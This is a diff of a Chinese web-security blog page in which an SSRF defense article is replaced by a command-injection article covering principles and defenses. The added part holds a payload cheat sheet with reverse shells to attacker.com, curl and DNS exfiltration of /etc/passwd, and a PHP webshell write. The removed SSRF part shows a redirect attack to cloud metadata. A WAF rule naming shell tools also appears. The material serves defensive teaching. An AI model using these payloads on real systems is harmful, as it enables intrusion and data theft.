-<pre><code class="python">def safe_fetch(url):
-    parsed = urlparse(url)
-    # 先解析域名
-    ip = socket.gethostbyname(parsed.hostname)
-    # 校验解析后的 IP
-    if is_internal_ip(ip):
-        raise ValueError(&quot;Internal IP not allowed&quot;)
-    # 用校验过的 IP 发起请求
-    ...
-</code></pre>
-<p><strong>必须过滤的地址范围：</strong></p>
-<p><code>10.0.0.0/8</code>、<code>172.16.0.0/12</code>、<code>192.168.0.0/16</code>——RFC 1918 私有地址。</p>
-<p><code>127.0.0.0/8</code>——回环地址。<code>127.0.0.1</code> 是 localhost，但 <code>127.0.0.2</code>、<code>127.x.x.x</code> 也指向本机。</p>
-<p><code>169.254.0.0/16</code>——链路本地地址。云元数据服务 <code>169.254.169.254</code> 在这个范围。</p>
-<p><code>0.0.0.0</code>——在某些系统上解析为 localhost。</p>
-<p><code>::1</code>、<code>fc00::/7</code>——IPv6 的回环和私有地址。</p>
-<p><strong>八进制/十六进制 IP 绕过：</strong> 某些 URL 解析器接受非十进制格式的 IP。<code>0177.0.0.1</code>（八进制）= <code>127.0.0.1</code>，<code>0x7f000001</code>（十六进制）= <code>127.0.0.1</code>。防御代码必须先将 IP 标准化为数字格式再比对。</p>
-<h4 id="3-3-协议白名单：只允许-HTTP-HTTPS"><a href="#3-3-协议白名单：只允许-HTTP-HTTPS" class="headerlink" title="3.3 协议白名单：只允许 HTTP/HTTPS"></a>3.3 协议白名单：只允许 HTTP/HTTPS</h4><p>禁止 <code>file://</code>、<code>gopher://</code>、<code>dict://</code>、<code>ldap://</code>、<code>ftp://</code> 等协议，只允许 <code>http://</code> 和 <code>https://</code>：</p>
-<pre><code class="python">def safe_fetch(url):
-    parsed = urlparse(url)
-    if parsed.scheme not in (&#39;http&#39;, &#39;https&#39;):
-        raise ValueError(f&quot;Protocol &#123;parsed.scheme&#125; not allowed&quot;)
-    ...
-</code></pre>
-<p><strong>为什么这能防协议利用攻击？</strong> 因为 <code>file:///etc/passwd</code> 和 <code>gopher://192.168.1.100:6379/...</code> 都依赖非 HTTP 协议。只允许 HTTP/HTTPS 后，这些攻击路径全部被切断。</p>
-<p><strong>注意事项：</strong> 某些 URL 解析器对协议的判断和服务端 HTTP 客户端不一致。例如 <code>http://attacker.com\@192.168.1.1</code>，URL 解析器认为域名是 <code>attacker.com</code>，但某些 HTTP 客户端实际请求的是 <code>192.168.1.1</code>。应该使用成熟的 URL 解析库，并在解析后重新构造 URL。</p>
-<h4 id="3-4-请求方法限制和响应处理"><a href="#3-4-请求方法限制和响应处理" class="headerlink" title="3.4 请求方法限制和响应处理"></a>3.4 请求方法限制和响应处理</h4><p><strong>只允许 GET 请求：</strong> 很多 SSRF 利用需要 POST 或其他方法（如 gopher 协议向 Redis 发送命令）。限制为 GET 可以减少攻击面。</p>
-<pre><code class="python"># 只允许 GET
-response = requests.get(url, timeout=5, allow_redirects=False)
-</code></pre>
-<p><strong>禁止跟随重定向：</strong> 服务端可能先校验 URL 合法，然后发起请求。如果 HTTP 客户端自动跟随重定向，攻击者可以先指向合法地址，然后 302 重定向到内网地址：</p>
-<pre><code>https://app.com/api/avatar?url=https://attacker.com/redirect
-  → 校验 URL：https://attacker.com/redirect → 合法（外部域名）
-  → 发起请求 → attacker.com 返回 302 Location: http://169.254.169.254/
-  → HTTP 客户端自动跟随重定向 → 请求到达云元数据服务
-</code></pre>
-<pre><code class="python"># 禁止自动跟随重定向
-response = requests.get(url, allow_redirects=False)
-# 如果需要跟随重定向，必须对每个重定向目标重新校验
-</code></pre>
-<p><strong>限制响应大小和超时：</strong> 防止 SSRF 被用于 DoS（让服务端下载超大文件或等待长时间无响应）。</p>
-<pre><code class="python">response = requests.get(url, timeout=5, stream=True)
-# 限制响应大小
-content = response.raw.read(1024 * 1024)  # 最多读 1MB
-</code></pre>
-<h4 id="3-5-统一防御方案"><a href="#3-5-统一防御方案" class="headerlink" title="3.5 统一防御方案"></a>3.5 统一防御方案</h4><p>将以上策略组合，形成一个完整的防御函数：</p>
-<pre><code class="python">import ipaddress
-import socket
-from urllib.parse import urlparse
+<p>重定向是写入 WebShell 和建立反向 Shell 的关键。</p>
+<h4 id="3-4-注入-payload-速查"><a href="#3-4-注入-payload-速查" class="headerlink" title="3.4 注入 payload 速查"></a>3.4 注入 payload 速查</h4><pre><code class="bash"># 基础分隔
+; id
+| id
+&amp;&amp; id
+|| id
 
-ALLOWED_SCHEMES = (&#39;http&#39;, &#39;https&#39;)
-BLOCKED_NETWORKS = [
-    ipaddress.ip_network(&#39;10.0.0.0/8&#39;),
-    ipaddress.ip_network(&#39;172.16.0.0/12&#39;),
-    ipaddress.ip_network(&#39;192.168.0.0/16&#39;),
-    ipaddress.ip_network(&#39;127.0.0.0/8&#39;),
-    ipaddress.ip_network(&#39;169.254.0.0/16&#39;),
-    ipaddress.ip_network(&#39;0.0.0.0/8&#39;),
-    ipaddress.ip_network(&#39;::1/128&#39;),
-    ipaddress.ip_network(&#39;fc00::/7&#39;),
-]
+# 命令替换（嵌入参数中）
+$(id)
+`id`
 
-def safe_fetch(url, max_size=1024*1024):
-    # 1. 协议白名单
-    parsed = urlparse(url)
-    if parsed.scheme not in ALLOWED_SCHEMES:
-        raise ValueError(f&quot;Protocol &#123;parsed.scheme&#125; not allowed&quot;)
+# 换行符（某些场景下 \n 也能分隔命令）
+%0a id
 
-    # 2. DNS 解析
-    try:
-        ip = socket.gethostbyname(parsed.hostname)
-    except socket.gaierror:
-        raise ValueError(&quot;Cannot resolve hostname&quot;)
+# 反向 Shell
+; bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1
+; python3 -c &#39;import socket,subprocess,os;s=socket.socket();s.connect((&quot;attacker.com&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#39;
 
-    # 3. 内网 IP 过滤
-    ip_obj = ipaddress.ip_address(ip)
-    if any(ip_obj in net for net in BLOCKED_NETWORKS):
-        raise ValueError(&quot;Internal IP not allowed&quot;)
+# 数据外带
+; curl http://attacker.com/log?data=$(cat /etc/passwd | base64)
+; dig $(whoami).attacker.com
 
-    # 4. 用解析后的 IP 发起请求（防 DNS 重绑定）
-    safe_url = url.replace(parsed.hostname, ip)
-    response = requests.get(
-        safe_url,
-        timeout=5,
-        allow_redirects=False,  # 禁止自动重定向
-        stream=True
-    )
+# 写入文件
+; echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; /var/www/html/shell.php
 
-    # 5. 限制响应大小
-    content = response.raw.read(max_size)
-    return content
-</code></pre>
-<p>如果业务需要跟随重定向，每次重定向都要重新校验目标 IP：</p>
-<pre><code class="python">def safe_fetch_with_redirects(url, max_redirects=3):
-    for _ in range(max_redirects):
-        # 每次迭代都重新执行完整的校验流程
-        parsed = urlparse(url)
-        ip = socket.gethostbyname(parsed.hostname)
-        if any(ipaddress.ip_address(ip) in net for net in BLOCKED_NETWORKS):
-            raise ValueError(&quot;Redirect to internal IP blocked&quot;)
-
-        response = requests.get(url, timeout=5, allow_redirects=False, stream=True)
-        if response.status_code in (301, 302, 303, 307, 308):
-            url = response.headers.get(&#39;Location&#39;)
-            if not url:
-                break
-            continue
-        # 非重定向响应，返回内容
-        return response.raw.read(1024*1024)
-    raise ValueError(&quot;Too many redirects&quot;)
+# 读取文件并通过 HTTP 外带
+; curl -F &quot;file=@/etc/passwd&quot; http://attacker.com/upload
 </code></pre>
 <hr>
-<h3 id="四、SSRF-与-CSRF-的对比"><a href="#四、SSRF-与-CSRF-的对比" class="headerlink" title="四、SSRF 与 CSRF 的对比"></a>四、SSRF 与 CSRF 的对比</h3><p>SSRF 和 CSRF 名字相似，攻击方向完全不同。对比理解有助于记忆：</p>
-<pre><code>              CSRF                          SSRF
-攻击对象     用户（借用户的浏览器发请求）     服务端（借服务端的网络发请求）
-攻击发生位置  客户端（浏览器）                服务端（后端应用）
-利用的能力    浏览器自动携带 Cookie           服务端可以访问内网
-攻击目标      以用户身份执行操作              访问内网服务/云元数据/本地文件
-防御核心      SameSite Cookie / CSRF Token   URL 白名单 / 内网 IP 过滤
+<h3 id="四、防御策略详解"><a href="#四、防御策略详解" class="headerlink" title="四、防御策略详解"></a>四、防御策略详解</h3><h4 id="4-1-避免调用系统命令：最根本的防御"><a href="#4-1-避免调用系统命令：最根本的防御" class="headerlink" title="4.1 避免调用系统命令：最根本的防御"></a>4.1 避免调用系统命令：最根本的防御</h4><p><strong>如果不需要执行系统命令，就不要调用。</strong> 大多数需要用系统命令实现的功能，都有对应的编程语言原生 API：</p>
+<pre><code class="python"># 危险：调用系统命令列出目录内容
+output = os.popen(f&#39;ls &#123;directory&#125;&#39;).read()
+
+# 安全：使用 Python 原生 API
+import os
+files = os.listdir(directory)
 </code></pre>
-<p>CSRF 中，攻击者需要诱导用户点击链接（用户是跳板）。SSRF 中，攻击者直接与服务端交互，不需要用户参与（服务端是跳板）。</p>
-<p>CSRF 的防御是确保”请求确实是用户主动发出的”（Token、SameSite）。SSRF 的防御是确保”服务端请求的地址是安全的”（白名单、IP 过滤）。</p>
-<p>两者的共同根源是：系统在处理外部输入时，没有校验请求的目标地址是否合法。CSRF 没有校验请求是否来自合法页面，SSRF 没有校验 URL 是否指向合法地址。</p>
+<pre><code class="python"># 危险：调用系统命令创建目录
+os.system(f&#39;mkdir &#123;dirname&#125;&#39;)
+
+# 安全：使用 Python 原生 API
+os.makedirs(dirname, exist_ok=True)
+</code></pre>
+<pre><code class="python"># 危险：调用系统命令发 HTTP 请求
+os.system(f&#39;curl &#123;url&#125;&#39;)
+
+# 安全：使用 requests 库
+import requests
+response = requests.get(url)
+</code></pre>
+<pre><code class="java">// 危险：Runtime.exec 执行系统命令
+Runtime.getRuntime().exec(&quot;ping &quot; + userInput);
+
+// 安全：使用 Java 原生网络 API
+InetAddress address = InetAddress.getByName(hostname);
+boolean reachable = address.isReachable(5000);
+</code></pre>
+<p><strong>为什么这是最根本的防御？</strong> 因为不调用系统命令就不存在命令注入的攻击面。没有 Shell 参与，就没有元字符解析，就没有注入的可能。</p>
+<p><strong>常见可以用原生 API 替代的场景：</strong></p>
+<p>文件操作（<code>ls</code>、<code>cp</code>、<code>mv</code>、<code>mkdir</code>、<code>rm</code>）→ <code>os.listdir</code>、<code>shutil.copy</code>、<code>os.rename</code>、<code>os.makedirs</code>。</p>
+<p>网络请求（<code>curl</code>、<code>wget</code>）→ <code>requests</code>、<code>urllib</code>、<code>HttpClient</code>。</p>
+<p>进程管理（<code>kill</code>、<code>ps</code>）→ <code>os.kill</code>、<code>psutil</code>。</p>
+<p>压缩解压（<code>tar</code>、<code>zip</code>）→ <code>tarfile</code>、<code>zipfile</code>。</p>
+<p>图像处理（<code>convert</code>）→ <code>Pillow</code>。</p>
+<h4 id="4-2-参数化调用：无法避免时的安全做法"><a href="#4-2-参数化调用：无法避免时的安全做法" class="headerlink" title="4.2 参数化调用：无法避免时的安全做法"></a>4.2 参数化调用：无法避免时的安全做法</h4><p>如果确实需要调用外部程序（如调用 <code>ffmpeg</code> 处理视频、调用 <code>gpg</code> 加密文件），<strong>不要通过 Shell 执行，使用参数数组的方式调用</strong>：</p>
+<pre><code class="python">import subprocess
+
+# 危险：通过 Shell 执行，用户输入被 Shell 解析
+subprocess.call(f&#39;ffmpeg -i &#123;input_file&#125; -vf scale=200:-1 &#123;output_file&#125;&#39;, shell=True)
+
+# 安全：参数数组，不经过 Shell，用户输入不会被解析为命令
+subprocess.run([
+    &#39;ffmpeg&#39;,
+    &#39;-i&#39;, input_file,
+    &#39;-vf&#39;, &#39;scale=200:-1&#39;,
+    output_file
+], check=True, capture_output=True)
+</code></pre>
+<p><strong>为什么参数数组安全？</strong> 因为 <code>subprocess.run(list)</code> 不调用 Shell，而是直接通过 <code>execve()</code> 系统调用执行目标程序。用户输入作为参数传递给 <code>ffmpeg</code>，不会被 Shell 解析。即使 <code>input_file</code> 的值是 <code>test; rm -rf /</code>，<code>ffmpeg</code> 只会把它当作一个文件名（不存在的文件名，会报错），不会执行 <code>rm</code> 命令。</p>
+<pre><code class="java">// Java: ProcessBuilder 使用参数数组，不经过 Shell
+ProcessBuilder pb = new ProcessBuilder(
+    &quot;ffmpeg&quot;,
+    &quot;-i&quot;, inputFile,
+    &quot;-vf&quot;, &quot;scale=200:-1&quot;,
+    outputFile
+);
+Process process = pb.start();
+</code></pre>
+<pre><code class="php">// PHP: escapeshellarg 对参数做 Shell 转义
+$input = escapeshellarg($userInput);
+$output = escapeshellarg($outputFile);
+exec(&quot;ffmpeg -i $input -vf scale=200:-1 $output&quot;);
+</code></pre>
+<p><strong>关键区别：</strong> <code>shell=True</code> 意味着命令字符串会被 Shell 解析（<code>/bin/sh -c &quot;...&quot;</code>），所有元字符生效。<code>shell=False</code>（Python 默认值）意味着直接执行目标程序，没有 Shell 参与，元字符无效。</p>
+<h4 id="4-3-输入白名单验证"><a href="#4-3-输入白名单验证" class="headerlink" title="4.3 输入白名单验证"></a>4.3 输入白名单验证</h4><p>如果必须将用户输入拼入命令字符串，先做严格的白名单验证：</p>
+<pre><code class="python">import re
+
+def validate_hostname(hostname):
+    # 只允许字母、数字、点号、连字符
+    if not re.match(r&#39;^[a-zA-Z0-9.\-]+$&#39;, hostname):
+        raise ValueError(&quot;Invalid hostname&quot;)
+    # 额外校验：必须是合法的域名格式
+    if not re.match(r&#39;^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$&#39;, hostname):
+        raise ValueError(&quot;Invalid hostname format&quot;)
+    return hostname
+
+# 使用
+hostname = validate_hostname(request.args.get(&#39;host&#39;))
+# 通过验证后，hostname 中不包含任何 Shell 元字符
+output = subprocess.run([&#39;ping&#39;, &#39;-c&#39;, &#39;4&#39;, hostname], capture_output=True, text=True)
+</code></pre>
+<p><strong>白名单的思路：</strong> 只允许已知安全的字符，拒绝一切其他字符。对于域名，只允许字母数字和 <code>.</code>、<code>-</code>；对于 IP 地址，只允许数字和 <code>.</code>；对于文件名，只允许字母数字和 <code>.</code>、<code>-</code>、<code>_</code>。</p>
+<p><strong>黑名单为什么不可靠？</strong> 因为 Shell 元字符太多（<code>;</code>、<code>|</code>、<code>&amp;</code>、<code>$</code>、<code>`</code>、<code>(</code>、<code>)</code>、<code>&#123;</code>、<code>&#125;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>?</code>、<code>*</code>、<code>[</code>、<code>]</code>、<code>~</code>、<code>!</code>、<code>#</code>、换行符、空格……），黑名单几乎不可能穷举。而且不同 Shell（bash、sh、zsh、csh）的元字符集合不同，不同操作系统的行为也不同。</p>
+<h4 id="4-4-Shell-转义"><a href="#4-4-Shell-转义" class="headerlink" title="4.4 Shell 转义"></a>4.4 Shell 转义</h4><p>如果实在无法避免通过 Shell 执行命令，且用户输入必须拼入命令字符串，使用 Shell 转义函数对用户输入进行转义：</p>
+<pre><code class="python">import shlex
+
+# shlex.quote 将字符串用单引号包裹，并转义内部的单引号
+user_input = &quot;test; rm -rf /&quot;
+safe_input = shlex.quote(user_input)
+# safe_input = &quot;&#39;test; rm -rf /&#39;&quot;
+# 单引号内的所有字符都是字面量，Shell 不会解析
+
+os.system(f&#39;echo &#123;safe_input&#125;&#39;)
+# 实际执行：echo &#39;test; rm -rf /&#39;
+# 输出：test; rm -rf /（纯文本，不会执行 rm）
+</code></pre>
+<pre><code class="java">// Java: 没有内置的 Shell 转义函数
+// 推荐做法：不使用 Shell，用 ProcessBuilder 参数数组
+// 如果必须用 Shell，手动用单引号包裹并转义内部单引号
+String safeInput = &quot;&#39;&quot; + userInput.replace(&quot;&#39;&quot;, &quot;&#39;\\&#39;&#39;&quot;) + &quot;&#39;&quot;;
+</code></pre>
+<p><strong>转义的局限性：</strong> Shell 转义容易出错——不同 Shell 的转义规则不同，嵌套引号的处理很复杂，编码问题（Unicode、空字节）可能导致转义失效。所以转义是最后的手段，优先使用参数化调用（4.2）。</p>
+<h4 id="4-5-最小权限原则"><a href="#4-5-最小权限原则" class="headerlink" title="4.5 最小权限原则"></a>4.5 最小权限原则</h4><p>即使命令注入发生，限制 Web 应用的运行权限可以减小影响范围：</p>
+<p><strong>不以 root 运行 Web 应用。</strong> 创建专用用户，只赋予必要的文件读写权限：</p>
+<pre><code class="bash"># 创建专用用户
+useradd -r -s /bin/false wwwapp
+# 设置文件权限
+chown -R wwwapp:wwwapp /var/www/app
+chmod 750 /var/www/app
+# Web 应用以 wwwapp 用户运行
+sudo -u wwwapp python3 app.py
+</code></pre>
+<p><strong>使用容器隔离。</strong> 将 Web 应用运行在 Docker 容器中，容器内的命令执行被限制在容器的文件系统和网络范围内：</p>
+<pre><code class="dockerfile">FROM python:3.11-slim
+# 不使用 root 运行
+RUN useradd -r appuser
+USER appuser
+COPY . /app
+WORKDIR /app
+CMD [&quot;python3&quot;, &quot;app.py&quot;]
+</code></pre>
+<pre><code class="yaml"># docker-compose.yml
+services:
+  web:
+    build: .
+    read_only: true           # 文件系统只读
+    security_opt:
+      - no-new-privileges:true # 禁止提权
+    cap_drop:
+      - ALL                   # 删除所有 Linux capabilities
+    networks:
+      - frontend              # 只暴露前端网络，不直接访问内网
+</code></pre>
+<p><strong>限制可用的系统命令。</strong> 如果应用只需要执行 <code>ping</code>，通过 <code>seccomp</code> 或 <code>AppArmor</code> 限制只能执行 <code>ping</code>，禁止 <code>bash</code>、<code>curl</code>、<code>wget</code> 等危险命令。</p>
+<h4 id="4-6-WAF-和运行时检测"><a href="#4-6-WAF-和运行时检测" class="headerlink" title="4.6 WAF 和运行时检测"></a>4.6 WAF 和运行时检测</h4><p>Web 应用防火墙（WAF）可以检测常见的命令注入 payload：</p>
+<pre><code># WAF 规则示例（伪代码）
+if request.param matches /;\s*(id|whoami|cat|ls|rm|wget|curl|bash|nc|python|perl)/
+    block request
+
+if request.param matches /\$\(|`|&amp;&amp;|\|\||\|/
+    flag as suspicious
+</code></pre>
+<p><strong>WAF 的局限性：</strong> WAF 基于模式匹配，可以被编码绕过（URL 编码、Unicode 编码、Base64）、换行符绕过（<code>%0a</code>）、通配符绕过（<code>/bin/ca?</code> 匹配 <code>/bin/cat</code>）。WAF 是辅助手段，不能替代代码层面的防御。</p>
 <hr>
-<h3 id="五、各语言-框架的-SSRF-风险点"><a href="#五、各语言-框架的-SSRF-风险点" class="headerlink" title="五、各语言/框架的 SSRF 风险点"></a>五、各语言/框架的 SSRF 风险点</h3><h4 id="5-1-Java"><a href="#5-1-Java" class="headerlink" title="5.1 Java"></a>5.1 Java</h4><p><code>java.net.URL</code> 和 <code>HttpURLConnection</code> 默认支持多种协议（<code>http</code>、<code>https</code>、<code>file</code>、<code>jar</code>、<code>ftp</code>）。如果直接用用户输入的 URL 构造 <code>URL</code> 对象并打开连接，<code>file:///etc/passwd</code> 会被读取。</p>
-<pre><code class="java">// 危险：直接接受用户输入的 URL
-URL url = new URL(userInput);
-URLConnection conn = url.openConnection();
-InputStream is = conn.getInputStream();
+<h3 id="五、各语言-框架的命令执行风险点"><a href="#五、各语言-框架的命令执行风险点" class="headerlink" title="五、各语言/框架的命令执行风险点"></a>五、各语言/框架的命令执行风险点</h3><h4 id="5-1-Python"><a href="#5-1-Python" class="headerlink" title="5.1 Python"></a>5.1 Python</h4><pre><code class="python"># 危险等级从高到低：
+os.system(user_input)              # 通过 Shell 执行，最危险
+os.popen(user_input)               # 通过 Shell 执行
+subprocess.call(cmd, shell=True)   # 通过 Shell 执行
+subprocess.run(cmd, shell=True)    # 通过 Shell 执行
+
+# 安全：
+subprocess.run([&#39;cmd&#39;, arg1, arg2])  # 不通过 Shell，参数数组
 </code></pre>
-<p>Spring 的 <code>RestTemplate</code> 和 <code>WebClient</code> 默认跟随重定向，需要在配置中禁用。</p>
-<h4 id="5-2-Python"><a href="#5-2-Python" class="headerlink" title="5.2 Python"></a>5.2 Python</h4><p><code>requests.get(url)</code> 默认跟随重定向（最多 30 次），默认支持 <code>http</code> 和 <code>https</code>，但不支持 <code>file://</code>。但如果使用 <code>urllib</code>，<code>file://</code> 协议是可用的。</p>
-<pre><code class="python"># 危险：urllib 支持 file://
-import urllib.request
-content = urllib.request.urlopen(user_input).read()
-# user_input = &quot;file:///etc/passwd&quot; → 读取本地文件
+<p><code>eval()</code> 和 <code>exec()</code> 虽然不是系统命令执行，但如果用户输入被传入，可以执行任意 Python 代码，危害等同于命令注入。</p>
+<h4 id="5-2-Java"><a href="#5-2-Java" class="headerlink" title="5.2 Java"></a>5.2 Java</h4><pre><code class="java">// 危险：通过 Shell 执行
+Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;ping &quot; + userInput&#125;);
+
+// 安全：直接执行，不通过 Shell
+Runtime.getRuntime().exec(new String[]&#123;&quot;ping&quot;, &quot;-c&quot;, &quot;4&quot;, hostname&#125;);
+
+// 安全：ProcessBuilder
+new ProcessBuilder(&quot;ping&quot;, &quot;-c&quot;, &quot;4&quot;, hostname).start();
 </code></pre>
-<p><code>curl</code> 命令行工具（如果通过 <code>subprocess</code> 调用）默认支持大量协议，包括 <code>dict://</code>、<code>gopher://</code>、<code>ftp://</code>。</p>
-<h4 id="5-3-PHP"><a href="#5-3-PHP" class="headerlink" title="5.3 PHP"></a>5.3 PHP</h4><p><code>file_get_contents()</code> 默认支持多种协议包装器（<code>file://</code>、<code>http://</code>、<code>ftp://</code>、<code>php://</code>、<code>data://</code>、<code>glob://</code>）。</p>
-<pre><code class="php">// 危险：file_get_contents 支持多种协议
-$content = file_get_contents($userInput);
-// $userInput = &quot;file:///etc/passwd&quot; → 读取本地文件
-// $userInput = &quot;php://filter/convert.base64-encode/resource=config.php&quot; → 读取 PHP 源码
+<p>Java 的 <code>Runtime.exec(String)</code> 在内部会将字符串按空格分割为参数数组，但分割逻辑与 Shell 不同，可能在特殊字符上产生意外行为。推荐使用 <code>exec(String[])</code> 或 <code>ProcessBuilder</code>。</p>
+<h4 id="5-3-PHP"><a href="#5-3-PHP" class="headerlink" title="5.3 PHP"></a>5.3 PHP</h4><pre><code class="php">// 危险：
+system($userInput);
+exec($userInput);
+passthru($userInput);
+shell_exec($userInput);
+`$userInput`;  // 反引号等同于 shell_exec
+
+// 转义（如果必须拼入命令）：
+$safe = escapeshellarg($userInput);   // 转义参数
+$safe = escapeshellcmd($userInput);   // 转义整个命令（不推荐，有已知绕过）
 </code></pre>
-<p><code>curl_exec()</code> 默认跟随重定向，且支持 <code>dict://</code>、<code>gopher://</code> 等协议（取决于编译选项）。</p>
-<h4 id="5-4-Node-js"><a href="#5-4-Node-js" class="headerlink" title="5.4 Node.js"></a>5.4 Node.js</h4><p>Node.js 原生 <code>http</code> 模块只支持 HTTP 协议，但第三方库如 <code>node-fetch</code>、<code>axios</code> 默认跟随重定向。<code>got</code> 库支持多种协议。</p>
-<pre><code class="javascript">// 危险：axios 默认跟随重定向
-const axios = require(&#39;axios&#39;);
-const response = await axios.get(userInput);
-// userInput 指向攻击者服务器 → 302 重定向到 http://169.254.169.254/
+<p><code>escapeshellcmd()</code> 有已知问题：它不处理参数中的特殊字符（如空格），可能导致参数被拆分。推荐用 <code>escapeshellarg()</code> 转义每个参数，或改用 PHP 原生函数。</p>
+<h4 id="5-4-Node-js"><a href="#5-4-Node-js" class="headerlink" title="5.4 Node.js"></a>5.4 Node.js</h4><pre><code class="javascript">// 危险：通过 Shell 执行
+const &#123; exec &#125; = require(&#39;child_process&#39;);
+exec(`ping -c 4 $&#123;userInput&#125;`);
+
+// 危险：spawn 但通过 Shell
+const &#123; spawn &#125; = require(&#39;child_process&#39;);
+spawn(&#39;ping&#39;, [&#39;-c&#39;, &#39;4&#39;, userInput], &#123; shell: true &#125;);
+
+// 安全：spawn 不通过 Shell
+const &#123; spawn &#125; = require(&#39;child_process&#39;);
+spawn(&#39;ping&#39;, [&#39;-c&#39;, &#39;4&#39;, userInput]);  // shell: false（默认值）
 </code></pre>
 <hr>
-<h3 id="六、防御优先级总结"><a href="#六、防御优先级总结" class="headerlink" title="六、防御优先级总结"></a>六、防御优先级总结</h3><p>按重要程度排列：</p>
+<h3 id="六、命令注入与其他注入的对比"><a href="#六、命令注入与其他注入的对比" class="headerlink" title="六、命令注入与其他注入的对比"></a>六、命令注入与其他注入的对比</h3><p>命令注入、SQL 注入、XSS 三者共享同一个根源——数据与指令边界混淆，但执行环境和影响范围不同：</p>
+<pre><code>              SQL 注入              XSS                    命令注入
+执行环境      数据库引擎            浏览器 JS 引擎          操作系统 Shell
+用户输入被当作  SQL 语句            JavaScript 代码         系统命令
+影响范围      数据库数据            用户浏览器会话           整个操作系统
+危害程度      数据泄露/篡改         会话劫持/钓鱼           远程代码执行
+防御核心      参数化查询            输出编码                 避免调用系统命令
+</code></pre>
+<p>命令注入之所以危害最大，是因为操作系统 Shell 的权限最高——它可以读写文件系统、发起网络请求、创建进程、修改系统配置。一旦攻击者通过命令注入获得 Shell 访问，整个服务器都在其控制之下。</p>
+<p><strong>命令注入与文件上传的关联：</strong> 文件上传中，文件名被传入系统命令时会触发命令注入（你在文件上传那篇中看到的文件名注入场景）。防御方式相同——对文件名做白名单验证，不信任用户输入。</p>
+<p><strong>命令注入与 SSRF 的关联：</strong> 某些命令注入可以通过 <code>curl</code> 或 <code>wget</code> 实现 SSRF 的效果（让服务端请求内网地址）。反过来，SSRF 如果支持 <code>gopher://</code> 协议，也可以向内网的 Redis/Memcached 发送命令实现类似命令注入的效果。</p>
+<hr>
+<h3 id="七、防御优先级总结"><a href="#七、防御优先级总结" class="headerlink" title="七、防御优先级总结"></a>七、防御优先级总结</h3><p>按重要程度排列：</p>
 <ol>
-<li><strong>URL 白名单</strong>——只允许请求预定义的安全域名，默认拒绝一切</li>
-<li><strong>内网 IP 过滤</strong>——DNS 解析后校验 IP，禁止请求私有地址和云元数据地址</li>
-<li><strong>协议白名单</strong>——只允许 <code>http://</code> 和 <code>https://</code>，禁止 <code>file://</code>、<code>gopher://</code> 等</li>
-<li><strong>禁止自动重定向</strong>——或每次重定向重新校验目标 IP</li>
-<li><strong>防 DNS 重绑定</strong>——校验后用已解析的 IP 直接发起请求</li>
-<li><strong>限制响应大小和超时</strong>——防止 DoS</li>
-<li><strong>最小权限原则</strong>——服务端应用使用最低权限运行，减少被利用后的影响范围</li>
+<li><strong>避免调用系统命令</strong>——用编程语言原生 API 替代，从根本上消除攻击面</li>
+<li><strong>参数化调用</strong>——无法避免时使用参数数组（<code>subprocess.run(list)</code>），不经过 Shell</li>
+<li><strong>输入白名单验证</strong>——只允许已知安全的字符（字母数字），拒绝一切特殊字符</li>
+<li><strong>Shell 转义</strong>——<code>shlex.quote()</code> 用单引号包裹用户输入，作为最后手段</li>
+<li><strong>最小权限运行</strong>——不以 root 运行 Web 应用，使用容器隔离</li>
+<li><strong>WAF 辅助检测</strong>——检测常见 payload，但不能替代代码层面防御</li>
 </ol>
 <hr>
-<h3 id="七、小结"><a href="#七、小结" class="headerlink" title="七、小结"></a>七、小结</h3><p>SSRF 的本质是攻击者借服务端的网络能力访问其本不该访问的地址。与 CSRF 形成对称——CSRF 借用户的浏览器发请求，SSRF 借服务端的网络发请求。</p>
-<p>按攻击效果分四种：基础 SSRF 探测和访问内网服务，云元数据攻击窃取 IAM 凭证（云环境中最致命），协议利用通过 gopher/dict/file 精确攻击内网非 HTTP 服务，盲 SSRF 无回显但可通过副作用触发内部操作。</p>
-<p>防御的核心是纵深防御。URL 白名单是最安全的策略，内网 IP 过滤是白名单不可用时的底线，协议白名单切断非 HTTP 协议的利用路径，禁止自动重定向和防 DNS 重绑定堵住校验后的绕过路径。组合使用才能有效防御。</p>
+<h3 id="八、小结"><a href="#八、小结" class="headerlink" title="八、小结"></a>八、小结</h3><p>命令注入的本质是用户输入被操作系统 Shell 当作命令执行，与 SQL 注入、XSS 共享同一个根源——数据与指令的边界混淆。但命令注入的危害最大，因为它直接影响操作系统，攻击者可以执行任意系统命令、读写文件、发起网络请求、获取服务器完全控制权。</p>
+<p>按利用方式分三种：直接注入有回显，可以立即读取数据和获取 Shell；盲注入无回显，通过时间延迟确认漏洞、通过 DNS/HTTP 外带窃取数据、通过写入文件持久化；间接注入通过文件名、环境变量等非显式输入通道触发。</p>
+<p>防御的核心思路是消除 Shell 参与。最安全的做法是不调用系统命令，用编程语言原生 API 替代。无法避免时使用参数数组调用（不经过 Shell），配合输入白名单验证。最小权限运行和容器隔离作为兜底，减小被利用后的影响范围。</p>
 
                 
             </div>
@@ -854,7 +896,7 @@ const response = await axios.get(userInput);
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2026/08/08/2026-08-08-ssrf-attacks-principles-and-defense/">http://example.com/2026/08/08/2026-08-08-ssrf-attacks-principles-and-defense/</a>
+                    <a href="http://example.com/2026/08/08/2026-08-08-command-injection-principles-and-defense/">http://example.com/2026/08/08/2026-08-08-command-injection-principles-and-defense/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -900,8 +942,8 @@ const response = await axios.get(userInput);
                                     <span class="chip bg-color">Web安全</span>
                                 </a>
                             
-                                <a href="/tags/SSRF/">
-                                    <span class="chip bg-color">SSRF</span>
+                                <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">命令注入</span>
                                 </a>
                             
                         </div>
@@ -1073,9 +1115,10 @@ const response = await axios.get(userInput);
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
